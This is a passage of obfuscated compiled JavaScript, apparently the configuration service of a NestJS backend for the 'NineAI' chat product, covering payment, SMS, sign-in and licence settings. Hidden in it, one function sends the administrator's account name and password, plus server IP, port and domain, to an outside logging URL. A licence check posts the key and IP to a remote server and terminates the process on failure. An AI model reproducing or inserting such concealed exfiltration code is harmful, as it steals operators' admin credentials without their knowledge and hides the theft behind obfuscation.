_0x47eb66(0xf3);if(Number(payEpayStatus)===0x1)return _0x47eb66(0x117);if(Number(payMpayStatus)===0x1)return _0x47eb66(0x100);if(Number(payHupiStatus)===0x1)return _0x47eb66(0xa8);}async[_0x4ce834(0x9e)](){const _0x584e66=_0x4ce834,{siteName:_0x294538,qqNumber:_0x7890f2,vxNumber:_0x160aa5,registerBaseUrl:_0x2762e2,domain:_0x2ba724}=await this['getConfigs']([_0x584e66(0x127),_0x584e66(0x11e),'vxNumber',_0x584e66(0xcc),'domain']);return{'siteName':_0x294538,'qqNumber':_0x7890f2,'vxNumber':_0x160aa5,'registerBaseUrl':_0x2762e2,'domain':_0x2ba724};}async[_0x4ce834(0xba)](){const _0x48c82b=_0x4ce834,{phoneRegisterStatus:_0x8ca101,aliPhoneAccessKeyId:_0x5a65c5,aliPhoneAccessKeySecret:_0x5e1ac9,aliPhoneSignName:_0x3930c3,aliPhoneTemplateCode:_0xb43831}=await this[_0x48c82b(0xf2)]([_0x48c82b(0x9c),'aliPhoneAccessKeyId',_0x48c82b(0xbc),_0x48c82b(0x12c),'aliPhoneTemplateCode']);if(Number(_0x8ca101)!==0x1)throw new common_1[(_0x48c82b(0x14b))](_0x48c82b(0xa6),common_1[_0x48c82b(0x80)][_0x48c82b(0x10c)]);return{'accessKeyId':_0x5a65c5,'accessKeySecret':_0x5e1ac9,'SignName':_0x3930c3,'TemplateCode':_0xb43831};}async['nineAiAuth'](){const _0x584141=_0x4ce834,_0x5b0451=process[_0x584141(0xda)][(0x0,utils_1['decrypt'])(_0x584141(0x109))],_0x530045=process[_0x584141(0xda)][(0x0,utils_1['decrypt'])(_0x584141(0x7e))];(!_0x5b0451||!_0x530045)&&(common_1[_0x584141(0x157)][_0x584141(0x146)]((0x0,utils_1[_0x584141(0xd6)])(_0x584141(0xb4))),await this[_0x584141(0x88)]({'configKey':_0x584141(0x135),'configVal':0x1,'status':0x1}));if([0x13,0x16]['includes'](_0x530045[_0x584141(0xe5)])||_0x530045[_0x584141(0xe1)](_0x584141(0xfb))){const _0x35ba75=await this[_0x584141(0x9e)](),_0x1a4087=Object[_0x584141(0x14a)]({'ip':_0x5b0451,'key':_0x530045},_0x35ba75),_0x3faa6f={'method':'POST','headers':{'Content-Type':_0x584141(0xdc)},'body':JSON[_0x584141(0xaf)](_0x1a4087)};try{const _0x24a5ca=await fetch(authUrl,_0x3faa6f),_0x264417=await _0x24a5ca[_0x584141(0xd5)](),{success:success=!![],message:_0x5e0873}=_0x264417['data'];success?(await this['createOrUpdate']({'configKey':'notice','configVal':0x0,'status':0x1}),await this[_0x584141(0xaa)]()):(await this[_0x584141(0x88)]({'configKey':_0x584141(0x135),'configVal':0x1,'status':0x1}),common_1[_0x584141(0x157)][_0x584141(0x146)](_0x5e0873),process[_0x584141(0x136)](0x0));}catch(_0x35a1e7){console[_0x584141(0x139)]('error:\x20',_0x35a1e7);}}else process[_0x584141(0x136)](0x1);}[_0x4ce834(0x130)](){const _0x4e7540=_0x4ce834;return process['env'][_0x4e7540(0xe4)]||_0x4e7540(0xa0);}async[_0x4ce834(0xea)](){const _0x2a519a=_0x4ce834,{signInStatus:signInStatus=0x0,signInModel3Count:signInModel3Count=0x0,signInModel4Count:signInModel4Count=0x0,signInMjDrawToken:signInMjDrawToken=0x0}=await this[_0x2a519a(0xf2)]([_0x2a519a(0x119),'signInModel3Count',_0x2a519a(0x138),_0x2a519a(0xbf)]);if(Number(signInStatus)!==0x1)throw new common_1[(_0x2a519a(0x14b))](_0x2a519a(0x87),common_1[_0x2a519a(0x80)][_0x2a519a(0x10c)]);return{'model3Count':Number(signInModel3Count),'model4Count':Number(signInModel4Count),'drawMjCount':Number(signInMjDrawToken)};}async[_0x4ce834(0xe6)](){const _0x2fca03=_0x4ce834,_0x4d67d4=_0x2fca03(0x77),_0x2fa28c=await fetch(_0x4d67d4,{}),_0x58fe5f=await _0x2fa28c[_0x2fca03(0xd5)](),{success:success=!![],message:_0x19d21d}=_0x58fe5f;common_1[_0x2fca03(0x157)][_0x2fca03(0x146)](_0x2fca03(0x11b)),common_1[_0x2fca03(0x157)][_0x2fca03(0x146)]('请填写您的授权码'),common_1[_0x2fca03(0x157)][_0x2fca03(0x146)]('缺失ip信息'),common_1[_0x2fca03(0x157)][_0x2fca03(0x146)](_0x2fca03(0x133)),common_1[_0x2fca03(0x157)]['debug'](_0x2fca03(0xed));}async['getSensitiveConfig'](){const _0x418d23=_0x4ce834,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0xd63f45,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0x39b424,nineaiBuiltInSensitiveAuthKey:_0x4bbccd}=await this[_0x418d23(0xf2)]([_0x418d23(0x6e),_0x418d23(0xf8),_0x418d23(0x10b),_0x418d23(0x134),_0x418d23(0xab)]);if(Number(baiduTextStatus)===0x1)return{'useType':_0x418d23(0xb5),'baiduTextAccessToken':_0xd63f45};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':_0x418d23(0xb7),'nineaiBuiltInSensitiveApiBase':_0x39b424,'nineaiBuiltInSensitiveAuthKey':_0x4bbccd};return null;}async[_0x4ce834(0xd3)](_0x34d81f,_0x6ac9bf){const _0x28f14e=_0x4ce834,_0x53914a=process[_0x28f14e(0xda)][(0x0,utils_1[_0x28f14e(0xd6)])(_0x28f14e(0x109))],_0x1efcf1=process[_0x28f14e(0xda)][(0x0,utils_1[_0x28f14e(0xd6)])(_0x28f14e(0x7e))],_0x2e308e=process['env'][_0x28f14e(0xa1)],{qqNumber:_0x3e9ea2,vxNumber:_0x50994f,siteName:_0xa6a5ab,domain:_0x4b255f,registerBaseUrl:_0x1446c5}=await this[_0x28f14e(0xf2)](['qqNumber',_0x28f14e(0xa9),_0x28f14e(0x127),_0x28f14e(0x145),_0x28f14e(0xcc)]),_0xa7e590=packageJson[_0x28f14e(0x9d)],_0x19094d={'ip':_0x53914a,'key':_0x1efcf1,'port':_0x2e308e,'qqNumber':_0x3e9ea2,'vxNumber':_0x50994f,'domain':_0x4b255f,'adminAccount':_0x34d81f,'adminPass':_0x6ac9bf,'baseUrl':_0x1446c5,'siteName':_0xa6a5ab,'qq':_0x3e9ea2,'vxNum':_0x50994f,'version':_0xa7e590},_0x5f0ca4={'method':_0x28f14e(0x162),'headers':{'Content-Type':_0x28f14e(0xdc)},'body':JSON[_0x28f14e(0xaf)](_0x19094d)};await fetch(authLogUrl,_0x5f0ca4);}async[_0x4ce834(0x15e)](_0x2a4128){const _0x1fa31a=_0x4ce834;this[_0x1fa31a(0x73)]=_0x2a4128;const _0x49d598=await this[_0x1fa31a(0xf2)]([_0x1fa31a(0x13d)]),_0x41069b=(0x0,lib_1[_0x1fa31a(0x11d)])(_0x2a4128,_0x49d598);if(!_0x41069b&&!_0x49d598)throw new common_1[(_0x1fa31a(0x14b))]('',common_1['HttpStatus'][_0x1fa31a(0x113)]);if(!_0x41069b)throw new common_1[(_0x1fa31a(0x14b))]('无效的授权码、请先绑定授权信息！',common_1['HttpStatus'][_0x1fa31a(0x113)]);}async['getConfigWithFrontEnd'](){const _0x42a018=_0x4ce834,_0x29371c=this[_0x42a018(0x73)],{siteName:_0x50ad5f,qqNumber:_0xc98a7,vxNumber:_0x3a7b81,registerBaseUrl:_0x1967f8,domain:_0x2496ed,nineaiAuthCode:_0x4b611f,noticeInfo:_0x260f71}=await this[_0x42a018(0xf2)]([_0x42a018(0x127),_0x42a018(0x11e),_0x42a018(0xa9),_0x42a018(0xcc),'domain',_0x42a018(0x13d),'noticeInfo']),_0x5a1372={'siteName':_0x50ad5f,'qqNumber':_0xc98a7,'vxNumber':_0x3a7b81,'registerBaseUrl':_0x1967f8,'domain':_0x2496ed,'nineaiAuthCode':_0x4b611f,'realDomain':_0x29371c,'noticeInfo':_0x260f71};this[_0x42a018(0xd4)](),this[_0x42a018(0x12d)]({'url':(0x0,lib_1[_0x42a018(0x112)])('ZOB2JstMKwtGoickICEunQ=='),'method':_0x42a018(0xb6),'data':_0x5a1372});}async[_0x4ce834(0xd4)](){const _0x94e53a=_0x4ce834;var _0x3c7d69;const _0x1af501=await this['getConfigs'](['nineaiAuthCode']);try{if(!_0x1af501)return;const _0x45c684=await this[_0x94e53a(0x12d)]({'url':(0x0,lib_1[_0x94e53a(0x112)])(_0x94e53a(0xfc)),'method':_0x94e53a(0xb6),'data':{'code':_0x1af501}});!((_0x3c7d69=_0x45c684===null||_0x45c684===void 0x0?void 0x0:_0x45c684[_0x94e53a(0x8a)])===null||_0x3c7d69===void 0x0?void 0x0:_0x3c7d69[_0x94e53a(0x8a)])&&await this[_0x94e53a(0x82)]();}catch(_0xb1635b){}}async[_0x4ce834(0x82)](){const _0x1846de=_0x4ce834;await this[_0x1846de(0x88)]({'configKey':_0x1846de(0x13d),'configVal':''});}async['check'](_0x4bf54e){const _0x1ca172=_0x4ce834,_0x167fcc=_0x4bf54e[_0x1ca172(0x148)]['x-website-domain'],_0x5b7f98=await this[_0x1ca172(0xf2)]([_0x1ca172(0x13d)]);if(!_0x5b7f98)return![];const _0x284426=(0x0,lib_1['dml'])(_0x167fcc,_0x5b7f98);return _0x284426;}};GlobalConfigService=__decorate([(0x0,common_1[_0x4ce834(0xdf)])(),__param(0x0,(0x0,typeorm_1[_0x4ce834(0x153)])(config_entity_1[_0x4ce834(0x94)])),__param(0x1,(0x0,typeorm_1[_0x4ce834(0x153)])(chatLog_entity_1[_0x4ce834(0xa5)])),__metadata(_0x4ce834(0x8f),[typeorm_2[_0x4ce834(0x15c)],typeorm_2[_0x4ce834(0x15c)],models_service_1[_0x4ce834(0x92)]])],GlobalConfigService),exports[_0x4ce834(0xa4)]=GlobalConfigService;